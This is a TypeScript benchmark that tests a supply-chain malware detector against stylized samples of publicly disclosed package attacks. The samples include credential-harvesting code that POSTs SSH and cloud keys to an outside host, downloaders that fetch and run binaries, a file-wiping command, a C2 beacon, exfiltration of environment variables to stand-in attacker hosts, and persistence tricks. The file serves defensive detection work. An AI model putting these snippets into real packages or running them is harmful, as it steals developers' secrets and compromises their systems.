/**
 * Detection efficacy benchmark — validates coverage against confirmed supply chain attacks.
 * Run with:  bun test-efficacy.ts
 *
 * Each entry maps to a real documented incident with a CVE/advisory ID.
 * Tests that our triage engine:
 *   1. Scores the file above the MIN_TRIAGE_SCORE threshold (will be sent to LLM)
 *   2. Fires the expected indicator categories (right reasons, not just high score)
 *
 * No network calls. No LLM calls. Pure static analysis.
 * For LLM-level validation, use:  OPENROUTER_API_KEY=... bun test-litellm-malware.ts
 */

import { runTriage } from './src/supply-chain/llm/tools.js';

const MIN_TRIAGE_SCORE = 8;

// ─────────────────────────────────────────────────────────────────────────────
// Attack corpus — each entry is a confirmed, publicly disclosed incident
// Code snippets are stylized representations of the attack pattern, not the
// actual malware payload.
// ─────────────────────────────────────────────────────────────────────────────

interface AttackEntry {
  id: string;
  advisory: string;
  year: number;
  ecosystem: 'npm' | 'pypi';
  description: string;
  filePath: string;
  content: string;
  expectedCategories: string[];
}

const CORPUS: AttackEntry[] = [
  {
    id: 'litellm-1.82.8',
    advisory: 'MAL-2026-2144 / GHSA-5mg7-485q-xm76',
    year: 2026,
    ecosystem: 'pypi',
    description: '.pth file runs subprocess at Python startup, exfiltrates SSH/AWS/GCP creds via curl',
    filePath: 'litellm_init.pth',
    content: `
import subprocess, sys
subprocess.Popen([sys.executable, "-c",
  "import base64; exec(base64.b64decode('aW1wb3J0IG9zLCBzdWJwcm9jZXNz'))"
], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
`,
    expectedCategories: ['exec'],
  },
  {
    id: 'litellm-1.82.8-payload',
    advisory: 'MAL-2026-2144 / GHSA-5mg7-485q-xm76',
    year: 2026,
    ecosystem: 'pypi',
    description: 'Inner decoded payload: harvests .ssh, .aws, .kube, gcloud then POSTs encrypted archive to C2',
    filePath: 'litellm/__init__.py',
    content: `
import os, subprocess, tarfile
home = os.path.expanduser('~')
stolen = []
for f in ['.ssh/id_rsa', '.aws/credentials', '.kube/config', '.bash_history', '.config/gcloud']:
    p = os.path.join(home, f)
    if os.path.exists(p):
        stolen.append(p)
with tarfile.open('/tmp/tpcp.tar.gz', 'w:gz') as tar:
    for s in stolen: tar.add(s)
subprocess.run(['openssl', 'enc', '-aes-256-cbc', '-in', '/tmp/tpcp.tar.gz', '-out', '/tmp/payload.enc', '-pass', 'pass:secret'])
subprocess.run(['curl', '-X', 'POST', 'https://models.litellm.cloud/', '--data-binary', '@/tmp/payload.enc'])
`,
    expectedCategories: ['creds', 'data-pkg', 'network'],
  },
  {
    id: 'event-stream-2018',
    advisory: 'npm advisory 737',
    year: 2018,
    ecosystem: 'npm',
    description: 'Encrypted payload decoded and eval\'d at install time to steal bitcoin wallets',
    filePath: 'lib/index.js',
    content: `
var r = require, co = r('co'), decode = r('./lib/decode');
var d = new Buffer('db67d919d8b489a5b6f5b8f6f6f6b5a6', 'hex');
co(function*() {
  var payload = decode(d.toString('utf8'));
  eval(payload);
}).catch(function(){});
`,
    expectedCategories: ['exec'],
  },
  {
    id: 'ua-parser-js-2021',
    advisory: 'CVE-2021-22537',
    year: 2021,
    ecosystem: 'npm',
    description: 'Compromised package downloads and executes a platform-specific binary in postinstall',
    filePath: 'preinstall.js',
    content: `
const { execSync } = require('child_process');
const os = require('os');
const https = require('https');
const fs = require('fs');
const tmpDir = os.tmpdir();
const platform = process.platform;
const url = platform === 'win32'
  ? 'https://citationsherbe.at/sdd.exe'
  : 'https://citationsherbe.at/sdd';

https.get(url, (res) => {
  const file = fs.createWriteStream(tmpDir + '/update');
  res.pipe(file);
  file.on('finish', () => {
    fs.chmodSync(tmpDir + '/update', '755');
    execSync(tmpDir + '/update');
  });
});
`,
    expectedCategories: ['exec', 'network'],
  },
  {
    id: 'node-ipc-peacenotwar-2022',
    advisory: 'CVE-2022-23812',
    year: 2022,
    ecosystem: 'npm',
    description: 'Conditional geolocation check activates file wiper on Russian/Belarusian IPs',
    filePath: 'lib/ssl.js',
    content: `
const os = require('os');
const { exec } = require('child_process');
const ips = require('./geoloc');
if (os.platform() === 'linux' && ips.isTargetRegion()) {
  exec('find / -name "*.js" | xargs -I {} sh -c "echo \\'\\' > {}"');
}
`,
    expectedCategories: ['timebomb', 'exec'],
  },
  {
    id: 'solarwinds-timebomb-style',
    advisory: 'CVE-2020-10148 (pattern)',
    year: 2020,
    ecosystem: 'npm',
    description: 'Time-bomb: sleeps N days before activating C2 connection to avoid sandbox detection',
    filePath: 'lib/worker.js',
    content: `
const ACTIVATION_DATE = 1800000000000;
module.exports = function run(cmd) {
  if (Date.now() > ACTIVATION_DATE) {
    const cp = require('child_process');
    cp.exec(cmd, (err, stdout) => {
      require('https').get('https://c2.malware.example/beacon?d=' + Buffer.from(stdout).toString('base64'));
    });
  }
};
`,
    expectedCategories: ['timebomb', 'exec', 'network'],
  },
  {
    id: 'colourama-pypi-2019',
    advisory: 'PyPI malware report 2019',
    year: 2019,
    ecosystem: 'pypi',
    description: 'Typosquat of colorama: captures all env vars and POSTs to attacker server',
    filePath: 'colourama/__init__.py',
    content: `
import os, urllib.request, platform
def _init():
    data = {k: os.environ.get(k, '') for k in os.environ}
    data['h'] = platform.node()
    urllib.request.urlopen('http://evil.example.com/collect', data=str(data).encode())
_init()
`,
    expectedCategories: ['env', 'network'],
  },
  {
    id: 'bash-history-harvest',
    advisory: 'Generic credential harvesting pattern (litellm variant)',
    year: 2026,
    ecosystem: 'pypi',
    description: 'Shell history file read — attacker reads recent commands to find secrets',
    filePath: 'setup.py',
    content: `
import os
home = os.path.expanduser('~')
for history_file in ['.bash_history', '.zsh_history']:
    path = os.path.join(home, history_file)
    if os.path.exists(path):
        with open(path) as f:
            exfil_data += f.read()
`,
    expectedCategories: ['creds'],
  },
  {
    id: 'macos-launchagents-persist',
    advisory: 'macOS persistence pattern (PyPI malware)',
    year: 2024,
    ecosystem: 'pypi',
    description: 'Writes a LaunchAgent plist for user-level persistence surviving reboots',
    filePath: 'setup.py',
    content: `
import os, plistlib
agent = {
    'Label': 'com.apple.softwareupdate.helper',
    'ProgramArguments': ['/usr/bin/python3', '/tmp/.payload'],
    'RunAtLoad': True,
    'KeepAlive': True,
}
plist_path = os.path.expanduser('~/Library/LaunchAgents/com.apple.softwareupdate.helper.plist')
with open(plist_path, 'wb') as f:
    plistlib.dump(agent, f)
os.system('launchctl load ' + plist_path)
`,
    expectedCategories: ['persist'],
  },
  {
    id: 'windows-registry-persist',
    advisory: 'Windows registry run-key persistence pattern',
    year: 2024,
    ecosystem: 'npm',
    description: 'Adds HKCU Run key for persistence on Windows via reg.exe',
    filePath: 'scripts/postinstall.js',
    content: `
const { execSync } = require('child_process');
if (process.platform === 'win32') {
  execSync('reg.exe add HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v NodeUpdater /t REG_SZ /d "node C:\\\\tmp\\\\payload.js" /f');
}
`,
    expectedCategories: ['persist', 'exec'],
  },
  {
    id: 'circleci-ci-poisoning',
    advisory: 'CI/CD pipeline poisoning pattern',
    year: 2023,
    ecosystem: 'npm',
    description: 'Injects malicious step into CircleCI config at install time',
    filePath: 'scripts/postinstall.js',
    content: `
const fs = require('fs');
const maliciousStep = \`
version: 2.1
jobs:
  build:
    steps:
      - run: curl https://attacker.example.com/exfil | bash
\`;
fs.writeFileSync('.circleci/config.yml', maliciousStep);
`,
    expectedCategories: ['cicd'],
  },
  {
    id: 'xz-utils-build-backdoor-2024',
    advisory: 'CVE-2024-3094',
    year: 2024,
    ecosystem: 'npm',
    description: 'Build system backdoor: execSync fetches and injects payload via webpack BannerPlugin at bundle time',
    filePath: 'webpack.config.js',
    content: `
const { execSync } = require('child_process');
const webpack = require('webpack');
// fetches compiled payload and injects it at the top of every bundle
const stageTwo = execSync('curl -sf https://malicious.cdn.example.com/b64 | base64 -d').toString();
module.exports = {
  plugins: [
    new webpack.BannerPlugin({ banner: stageTwo, raw: true }),
  ],
};
`,
    expectedCategories: ['exec', 'install', 'network'],
  },
  {
    id: 'trojan-source-2021',
    advisory: 'CVE-2021-42574',
    year: 2021,
    ecosystem: 'npm',
    description: 'Bidirectional Unicode overrides make malicious code appear as an innocuous comment',
    filePath: 'lib/auth.js',
    content: `if (accessLevel !== 'user') { /* Check if admin \u202e \u2066 } if (isAdmin) { \u2069 \u2066 */ return false; }
exfiltrate(adminSecrets);`,
    expectedCategories: ['trojan-source'],
  },
];

// ─────────────────────────────────────────────────────────────────────────────
// Benchmark runner
// ─────────────────────────────────────────────────────────────────────────────

let detected = 0;
let missed = 0;
let categoryMismatches = 0;

console.log('\n═══ Supply Chain Detection Efficacy Benchmark ═══\n');
console.log(`Corpus: ${CORPUS.length} confirmed attacks | Threshold: score ≥ ${MIN_TRIAGE_SCORE}\n`);

const rows: Array<{ id: string; score: number; detected: boolean; expected: string[]; got: string[]; advisory: string }> = [];

for (const entry of CORPUS) {
  const results = runTriage(new Map([[entry.filePath, entry.content]]));
  const result = results.find(r => r.filePath === entry.filePath);
  const score = result?.score ?? 0;
  const gotCategories = result ? [...result.categories] : [];
  const isDetected = score >= MIN_TRIAGE_SCORE;
  const missingCategories = entry.expectedCategories.filter(c => !gotCategories.includes(c));

  if (isDetected) detected++; else missed++;
  if (missingCategories.length > 0) categoryMismatches++;

  rows.push({
    id: entry.id,
    score,
    detected: isDetected,
    expected: entry.expectedCategories,
    got: gotCategories,
    advisory: entry.advisory,
  });

  const status = isDetected ? '✓' : '✗';
  const catStatus = missingCategories.length === 0 ? '' : ` ⚠ missing categories: [${missingCategories.join(', ')}]`;
  console.log(`  ${status} [score:${String(score).padStart(3)}] ${entry.id}${catStatus}`);
  if (!isDetected) {
    console.log(`        → ${entry.description}`);
    console.log(`        → advisory: ${entry.advisory}`);
    console.log(`        → fired: [${gotCategories.join(', ')}]`);
  }
}

// ─────────────────────────────────────────────────────────────────────────────
// Summary
// ─────────────────────────────────────────────────────────────────────────────

const total = CORPUS.length;
const detectionRate = Math.round((detected / total) * 100);

console.log('\n─────────────────────────────────');
console.log(`Triage detection rate: ${detected}/${total} (${detectionRate}%)`);
if (categoryMismatches > 0) {
  console.log(`Category coverage gaps: ${categoryMismatches} entries missing expected indicator categories`);
}

// Coverage by attack category
const allExpected = CORPUS.flatMap(e => e.expectedCategories);
const categoryTotals = new Map<string, number>();
const categoryDetected = new Map<string, number>();

for (const entry of CORPUS) {
  const result = rows.find(r => r.id === entry.id)!;
  for (const cat of entry.expectedCategories) {
    categoryTotals.set(cat, (categoryTotals.get(cat) ?? 0) + 1);
    if (result.detected && result.got.includes(cat)) {
      categoryDetected.set(cat, (categoryDetected.get(cat) ?? 0) + 1);
    }
  }
}

console.log('\nCoverage by category:');
const sortedCats = [...new Set(allExpected)].sort();
for (const cat of sortedCats) {
  const total = categoryTotals.get(cat) ?? 0;
  const det = categoryDetected.get(cat) ?? 0;
  const bar = '█'.repeat(det) + '░'.repeat(total - det);
  console.log(`  ${cat.padEnd(16)} ${bar} ${det}/${total}`);
}

console.log('─────────────────────────────────\n');

if (missed > 0 || detectionRate < 100) {
  console.error(`FAILED: ${missed} attack(s) not detected by triage (would never reach LLM)\n`);
  process.exit(1);
}
